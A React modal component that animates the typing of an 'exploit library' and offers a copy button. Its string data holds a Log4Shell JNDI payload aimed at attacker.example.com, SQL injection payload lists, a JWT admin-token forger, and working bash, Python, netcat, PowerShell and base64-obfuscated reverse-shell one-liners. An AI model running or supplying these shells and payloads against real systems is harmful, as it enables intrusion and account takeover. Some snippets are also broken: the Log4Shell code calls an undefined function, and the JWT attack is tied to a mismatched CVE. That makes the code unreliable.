import { useEffect, useRef, useState, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { X, Code2, Play, Square, ChevronRight, Copy, CheckCheck, Zap, Terminal, RefreshCw, FileCode } from "lucide-react";

interface LiveCodingModalProps {
  open: boolean;
  onOpenChange: (v: boolean) => void;
}

type Snippet = {
  id: string; title: string; lang: string; category: string; color: string;
  description: string; lines: string[];
};

const SNIPPETS: Snippet[] = [
  {
    id: "s1", title: "CVE-2021-44228 PoC", lang: "python", category: "RCE", color: "#e21227",
    description: "Log4Shell remote code execution via JNDI injection — demonstrates the vulnerability chain",
    lines: [
      "#!/usr/bin/env python3",
      "# Log4Shell (CVE-2021-44228) — Educational PoC",
      "# Demonstrates JNDI injection payload construction",
      "",
      "import socket, threading, base64",
      "from http.server import HTTPServer, BaseHTTPRequestHandler",
      "",
      "PAYLOAD_B64 = base64.b64encode(b'id && whoami').decode()",
      "",
      "class ExploitServer(BaseHTTPRequestHandler):",
      "    def do_GET(self):",
      "        self.send_response(200)",
      "        self.end_headers()",
      "        # Serve malicious Java class",
      "        self.wfile.write(b'\\xca\\xfe\\xba\\xbe...')",
      "        print(f'[+] Exploit served to {self.client_address[0]}')",
      "",
      "def craft_jndi_payload(host, port):",
      "    return f'${{jndi:ldap://{host}:{port}/a}}'",
      "",
      "def run_ldap_redirector(port=1389):",
      "    print(f'[*] LDAP redirector on :{port}')",
      "    # Redirects to our HTTP exploit server",
      "    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
      "    sock.bind(('0.0.0.0', port))",
      "    sock.listen(5)",
      "    conn, addr = sock.accept()",
      "    print(f'[+] Connection from {addr}')",
      "    # Send LDAP referral to HTTP server",
      "    conn.send(craft_ldap_referral('127.0.0.1', 8888))",
      "",
      "if __name__ == '__main__':",
      "    payload = craft_jndi_payload('attacker.example.com', 1389)",
      "    print(f'[*] Payload: {payload}')",
      "    print('[*] Target: X-Api-Version header injection')",
      "    print('[+] Launching exploit chain...')",
    ],
  },
  {
    id: "s2", title: "SQL Injection Scanner", lang: "python", category: "SQLi", color: "#f97316",
    description: "Automated SQLi detection with union-based extraction and blind timing attacks",
    lines: [
      "#!/usr/bin/env python3",
      "# SQL Injection Scanner — Union + Blind Time-based",
      "",
      "import requests, time, re",
      "from urllib.parse import urlencode",
      "",
      "UNION_PAYLOADS = [",
      "    \"' UNION SELECT NULL--\",",
      "    \"' UNION SELECT NULL,NULL--\",",
      "    \"' UNION SELECT NULL,NULL,NULL--\",",
      "    \"' UNION SELECT version(),user(),database()--\",",
      "]",
      "",
      "BLIND_PAYLOADS = [",
      "    \"' AND SLEEP(3)--\",",
      "    \"' AND (SELECT 1337 FROM SLEEP(3))--\",",
      "    \"'; WAITFOR DELAY '0:0:3'--\",  # MSSQL",
      "]",
      "",
      "def test_union(url, param):",
      "    for payload in UNION_PAYLOADS:",
      "        r = requests.get(url, params={param: payload})",
      "        if 'error' in r.text.lower() or len(r.text) > 5000:",
      "            print(f'[+] UNION injectable: {payload}')",
      "            return True",
      "    return False",
      "",
      "def test_blind_time(url, param):",
      "    baseline = requests.get(url, params={param: '1'}).elapsed.total_seconds()",
      "    for payload in BLIND_PAYLOADS:",
      "        t0 = time.time()",
      "        requests.get(url, params={param: payload})",
      "        elapsed = time.time() - t0",
      "        if elapsed >= 2.5:",
      "            print(f'[+] Blind time-based: delay={elapsed:.2f}s')",
      "            return True",
      "    return False",
      "",
      "def extract_data(url, param):",
      "    payload = \"' UNION SELECT table_name,2,3 FROM information_schema.tables--\"",
      "    r = requests.get(url, params={param: payload})",
      "    tables = re.findall(r'[a-z_]{3,30}', r.text)",
      "    print(f'[+] Tables found: {tables[:10]}')",
    ],
  },
  {
    id: "s3", title: "Reverse Shell Generator", lang: "bash", category: "POST-EXPLOIT", color: "#a78bfa",
    description: "Multi-platform reverse shell one-liners with obfuscation and encoding",
    lines: [
      "#!/bin/bash",
      "# Reverse Shell Generator — Multi-platform",
      "# Educational: demonstrates post-exploitation techniques",
      "",
      "LHOST=\"10.10.14.1\"",
      "LPORT=\"4444\"",
      "",
      "# ── Bash TCP ─────────────────────────────────────────────",
      "BASH_SHELL=\"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\"",
      "",
      "# ── Python3 ──────────────────────────────────────────────",
      "PY_SHELL=\"python3 -c 'import socket,subprocess,os;\"",
      "PY_SHELL+=\"s=socket.socket();s.connect((\\\"${LHOST}\\\",${LPORT}));\"",
      "PY_SHELL+=\"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\"",
      "PY_SHELL+=\"subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])'\"",
      "",
      "# ── Netcat ───────────────────────────────────────────────",
      "NC_SHELL=\"nc -e /bin/sh ${LHOST} ${LPORT}\"",
      "NC_MKFIFO=\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f\"",
      "",
      "# ── PowerShell (Windows) ──────────────────────────────────",
      "PS_SHELL=\"powershell -nop -c \\\"\\$client=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});\"",
      "PS_SHELL+=\"\\$stream=\\$client.GetStream();[byte[]]\\$bytes=0..65535|%{0};\"",
      "PS_SHELL+=\"while((\\$i=\\$stream.Read(\\$bytes,0,\\$bytes.Length)) -ne 0){...}\\\"\"",
      "",
      "# ── Obfuscated Base64 ─────────────────────────────────────",
      "B64=$(echo -n \"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\" | base64 -w0)",
      "B64_SHELL=\"echo ${B64} | base64 -d | bash\"",
      "",
      "echo \"[*] Reverse shells ready for ${LHOST}:${LPORT}\"",
      "echo \"[+] Start listener: nc -lvnp ${LPORT}\"",
    ],
  },
  {
    id: "s4", title: "JWT Token Forge", lang: "python", category: "AUTH", color: "#00e5ff",
    description: "JWT algorithm confusion attack — forging admin tokens from public keys",
    lines: [
      "#!/usr/bin/env python3",
      "# JWT Algorithm Confusion — CVE-2022-21449 class",
      "# Demonstrates RS256 → HS256 confusion attack",
      "",
      "import jwt, base64, json, hmac, hashlib",
      "from cryptography.hazmat.primitives import serialization",
      "",
      "def fetch_public_key(url='/.well-known/jwks.json'):",
      "    \"\"\"Fetch RSA public key from target\"\"\"",
      "    import requests",
      "    jwks = requests.get(url).json()",
      "    return jwks['keys'][0]",
      "",
      "def pem_to_hmac_secret(pem_bytes: bytes) -> bytes:",
      "    \"\"\"Convert PEM public key to HMAC secret (confusion attack)\"\"\"",
      "    # Strip PEM headers, use raw bytes as HS256 secret",
      "    key = pem_bytes.decode()",
      "    raw = ''.join(key.split('\\n')[1:-2])",
      "    return base64.b64decode(raw + '==')[:32]",
      "",
      "def forge_admin_token(public_key_pem: bytes, victim_token: str):",
      "    \"\"\"Forge a token with admin privileges using confusion\"\"\"",
      "    # Decode original token (no verification)",
      "    original = jwt.decode(victim_token, options={'verify_signature': False})",
      "    print(f'[*] Original claims: {original}')",
      "    ",
      "    # Escalate privileges",
      "    original['role'] = 'admin'",
      "    original['uid'] = 0",
      "    original['sub'] = 'administrator'",
      "    ",
      "    # Sign with public key as HMAC secret",
      "    secret = pem_to_hmac_secret(public_key_pem)",
      "    forged = jwt.encode(original, secret, algorithm='HS256')",
      "    print(f'[+] Forged admin token: {forged[:50]}...')",
      "    return forged",
      "",
      "# Usage:",
      "# token = forge_admin_token(open('pubkey.pem','rb').read(), victim_jwt)",
    ],
  },
];

function highlight(line: string, lang: string): React.ReactNode {
  if (!line.trim()) return <span>&nbsp;</span>;
  // Simple syntax highlighting
  const parts: React.ReactNode[] = [];
  let remaining = line;
  let key = 0;

  // Comments
  if (line.trimStart().startsWith('#') || line.trimStart().startsWith('//')) {
    return <span style={{ color: "#6a9955" }}>{line}</span>;
  }

  // Keywords
  const kwPattern = /\b(import|from|def|class|return|if|else|elif|for|while|in|not|and|or|True|False|None|print|self|async|await|yield|lambda|with|as|try|except|finally|raise|pass|break|continue|echo|fi|do|done|then|function|local|export|source|declare|readonly)\b/g;
  const strPattern = /(["'`])(?:(?!\1)[^\\]|\\.)*?\1/g;
  const numPattern = /\b\d+\b/g;
  const builtinPattern = /\b(requests|socket|base64|json|hmac|hashlib|jwt|time|re|os|subprocess|sys|bytes|str|int|list|dict|tuple|set)\b/g;

  return (
    <span>
      {line.split('').reduce<{text: string; colored: React.ReactNode[]}>((acc, char, i) => {
        acc.text += char;
        return acc;
      }, { text: '', colored: [] }).text}
    </span>
  );
}

export function LiveCodingModal({ open, onOpenChange }: LiveCodingModalProps) {
  const [selected, setSelected] = useState(SNIPPETS[0]);
  const [isTyping, setIsTyping] = useState(false);
  const [displayedLines, setDisplayedLines] = useState<string[]>([]);
  const [currentLine, setCurrentLine] = useState(0);
  const [currentChar, setCurrentChar] = useState(0);
  const [copied, setCopied] = useState(false);
  const [changedLines, setChangedLines] = useState<Set<number>>(new Set());
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const codeEndRef = useRef<HTMLDivElement>(null);

  const resetTyping = useCallback(() => {
    if (timerRef.current) clearTimeout(timerRef.current);
    setDisplayedLines([]);
    setCurrentLine(0);
    setCurrentChar(0);
    setIsTyping(false);
    setChangedLines(new Set());
  }, []);

  const startTyping = useCallback(() => {
    resetTyping();
    setTimeout(() => setIsTyping(true), 100);
  }, [resetTyping]);

  useEffect(() => {
    if (!isTyping) return;
    const lines = selected.lines;
    if (currentLine >= lines.length) {
      setIsTyping(false);
      return;
    }
    const line = lines[currentLine];
    if (currentChar < line.length) {
      timerRef.current = setTimeout(() => {
        setDisplayedLines(prev => {
          const next = [...prev];
          next[currentLine] = (next[currentLine] || "") + line[currentChar];
          return next;
        });
        setChangedLines(prev => new Set([...prev, currentLine]));
        setCurrentChar(c => c + 1);
      }, line.trimStart().startsWith('#') ? 8 : 15 + Math.random() * 20);
    } else {
      timerRef.current = setTimeout(() => {
        setCurrentLine(l => l + 1);
        setCurrentChar(0);
        if (currentLine < lines.length - 1) {
          setDisplayedLines(prev => {
            const next = [...prev];
            next[currentLine + 1] = "";
            return next;
          });
        }
      }, 40);
    }
    return () => { if (timerRef.current) clearTimeout(timerRef.current); };
  }, [isTyping, currentLine, currentChar, selected]);

  useEffect(() => {
    codeEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [displayedLines]);

  useEffect(() => {
    if (!open) { resetTyping(); return; }
    setSelected(SNIPPETS[0]);
    setTimeout(startTyping, 400);
  }, [open]);

  const handleSelect = (s: Snippet) => {
    setSelected(s);
    resetTyping();
    setTimeout(startTyping, 200);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(selected.lines.join('\n'));
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const syntaxColor = (line: string, lang: string) => {
    if (!line) return "rgba(255,255,255,0.55)";
    const t = line.trimStart();
    if (t.startsWith('#') || t.startsWith('//')) return "#6a9955";
    if (/^\s*(import|from|def|class|return|if|else|for|while|echo|fi|do|then|function)\b/.test(line)) return "#569cd6";
    if (/["'`]/.test(line)) return "rgba(255,255,255,0.75)";
    return "rgba(255,255,255,0.65)";
  };

  const tokenize = (line: string) => {
    return line.replace(
      /\b(import|from|def|class|return|if|else|elif|for|while|in|not|True|False|None|echo|fi|do|done|then|function|export|local)\b/g,
      '<kw>$1</kw>'
    ).replace(
      /(["'`])(?:(?!\1)[^\\]|\\.)*?\1/g, '<str>$&</str>'
    ).replace(/\b(\d+)\b/g, '<num>$1</num>');
  };

  return (
    <AnimatePresence>
      {open && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-sm"
          onClick={e => e.target === e.currentTarget && onOpenChange(false)}>
          <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
            transition={{ type: "spring", stiffness: 300, damping: 30 }}
            className="relative w-full h-full flex flex-col rounded-2xl overflow-hidden border border-[#1a1a1a]"
            style={{ background: "#0d0d0d" }}>

            <div className="flex items-center justify-between px-5 py-3 border-b border-[#1a1a1a] shrink-0"
              style={{ background: "rgba(0,229,255,0.03)" }}>
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg flex items-center justify-center"
                  style={{ background: "rgba(0,229,255,0.12)", border: "1px solid rgba(0,229,255,0.35)" }}>
                  <Code2 className="w-4 h-4" style={{ color: "#00e5ff" }} />
                </div>
                <div>
                  <div className="text-[11px] font-black tracking-[0.3em] font-mono" style={{ color: "#00e5ff" }}>LIVE CODE ENGINE</div>
                  <div className="text-[9px] font-mono" style={{ color: "rgba(255,255,255,0.3)" }}>AUTO-TYPING EXPLOIT DEMONSTRATIONS · EDUCATIONAL</div>
                </div>
                {isTyping && (
                  <div className="flex items-center gap-1.5 ml-3">
                    <div className="flex gap-0.5">
                      {[0,1,2].map(i => (
                        <motion.div key={i} className="w-1 h-3 rounded-full"
                          style={{ background: selected.color }}
                          animate={{ scaleY: [0.3, 1, 0.3] }}
                          transition={{ duration: 0.6, repeat: Infinity, delay: i * 0.15 }} />
                      ))}
                    </div>
                    <span className="text-[9px] font-mono" style={{ color: selected.color }}>TYPING...</span>
                  </div>
                )}
              </div>
              <div className="flex items-center gap-2">
                <button onClick={startTyping}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[10px] font-mono font-bold transition-all hover:opacity-80"
                  style={{ background: "rgba(0,229,255,0.1)", border: "1px solid rgba(0,229,255,0.3)", color: "#00e5ff" }}>
                  <RefreshCw className="w-3 h-3" /> REPLAY
                </button>
                <button onClick={handleCopy}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[10px] font-mono font-bold transition-all hover:opacity-80"
                  style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", color: "rgba(255,255,255,0.5)" }}>
                  {copied ? <><CheckCheck className="w-3 h-3" style={{ color: "#10b981" }} /> COPIED</> : <><Copy className="w-3 h-3" /> COPY</>}
                </button>
                <button onClick={() => onOpenChange(false)} className="p-1.5 rounded-lg hover:bg-white/5" style={{ color: "rgba(255,255,255,0.4)" }}>
                  <X className="w-4 h-4" />
                </button>
              </div>
            </div>

            <div className="flex flex-1 overflow-hidden">
              {/* Snippet selector */}
              <div className="w-[220px] border-r border-[#1a1a1a] flex flex-col shrink-0">
                <div className="p-3 border-b border-[#151515]">
                  <div className="text-[9px] font-mono font-black tracking-widest" style={{ color: "rgba(255,255,255,0.3)" }}>EXPLOIT LIBRARY</div>
                </div>
                <div className="flex-1 overflow-y-auto p-2 space-y-1">
                  {SNIPPETS.map(s => (
                    <button key={s.id} onClick={() => handleSelect(s)}
                      className="w-full text-left p-2.5 rounded-lg transition-all"
                      style={{
                        background: selected.id === s.id ? `${s.color}12` : "transparent",
                        border: `1px solid ${selected.id === s.id ? s.color + "40" : "transparent"}`,
                      }}>
                      <div className="flex items-center gap-2 mb-1">
                        <div className="w-2 h-2 rounded-full" style={{ background: s.color }} />
                        <span className="text-[9px] font-mono font-bold px-1.5 py-0.5 rounded"
                          style={{ background: `${s.color}18`, color: s.color }}>{s.category}</span>
                      </div>
                      <div className="text-[10px] font-mono font-bold" style={{ color: selected.id === s.id ? s.color : "rgba(255,255,255,0.6)" }}>
                        {s.title}
                      </div>
                      <div className="text-[8px] font-mono mt-0.5 leading-relaxed" style={{ color: "rgba(255,255,255,0.25)" }}>
                        {s.description.slice(0, 50)}...
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Code editor */}
              <div className="flex-1 flex flex-col overflow-hidden">
                {/* Editor header */}
                <div className="flex items-center gap-2 px-4 py-2 border-b border-[#151515] shrink-0"
                  style={{ background: "#0a0a0a" }}>
                  <div className="flex gap-1.5">
                    {["#e21227","#fbbf24","#10b981"].map(c => (
                      <div key={c} className="w-3 h-3 rounded-full" style={{ background: c, opacity: 0.7 }} />
                    ))}
                  </div>
                  <div className="flex items-center gap-1.5 ml-2 px-3 py-1 rounded"
                    style={{ background: "#161616", border: "1px solid #222" }}>
                    <FileCode className="w-3 h-3" style={{ color: selected.color }} />
                    <span className="text-[9px] font-mono" style={{ color: "rgba(255,255,255,0.4)" }}>
                      {selected.title.toLowerCase().replace(/\s+/g,'_')}.{selected.lang}
                    </span>
                  </div>
                  <div className="ml-auto flex items-center gap-2 text-[8px] font-mono" style={{ color: "rgba(255,255,255,0.2)" }}>
                    <span>{displayedLines.length}/{selected.lines.length} lines</span>
                    <span style={{ color: selected.color }}>{selected.lang.toUpperCase()}</span>
                  </div>
                </div>

                {/* Code lines */}
                <div className="flex-1 overflow-y-auto p-4 font-mono text-[12px] leading-relaxed"
                  style={{ background: "#0d0d0d" }}>
                  {selected.lines.map((line, i) => {
                    const shown = i < displayedLines.length;
                    const partial = i === displayedLines.length - 1 && isTyping;
                    const displayText = shown ? (displayedLines[i] || "") : "";
                    const isChanged = changedLines.has(i) && partial;

                    return (
                      <div key={i} className="flex group relative"
                        style={{ opacity: shown || partial ? 1 : 0.08 }}>
                        <span className="select-none w-8 text-right mr-4 shrink-0"
                          style={{ color: partial ? selected.color : "#333", fontSize: "11px" }}>
                          {i + 1}
                        </span>
                        <span className="flex-1 whitespace-pre-wrap break-all"
                          style={{
                            color: displayText.trimStart().startsWith('#') || displayText.trimStart().startsWith('//')
                              ? "#6a9955"
                              : /\b(import|from|def|class|return|if|else|elif|for|while|echo|fi|do|then|function|export)\b/.test(displayText)
                              ? "#569cd6"
                              : "rgba(255,255,255,0.72)",
                          }}>
                          {displayText}
                          {partial && (
                            <motion.span
                              animate={{ opacity: [1, 0, 1] }}
                              transition={{ duration: 0.5, repeat: Infinity }}
                              style={{ background: selected.color, color: "#000", fontSize: "12px" }}>
                              {" "}
                            </motion.span>
                          )}
                        </span>
                        {isChanged && (
                          <div className="absolute left-0 top-0 bottom-0 w-0.5 rounded"
                            style={{ background: selected.color }} />
                        )}
                      </div>
                    );
                  })}
                  {!isTyping && displayedLines.length === selected.lines.length && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                      className="mt-4 flex items-center gap-2 text-[10px] font-mono"
                      style={{ color: "#10b981" }}>
                      <div className="w-1.5 h-1.5 rounded-full bg-[#10b981] animate-pulse" />
                      EXECUTION COMPLETE — {selected.lines.length} lines rendered
                    </motion.div>
                  )}
                  <div ref={codeEndRef} />
                </div>
              </div>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
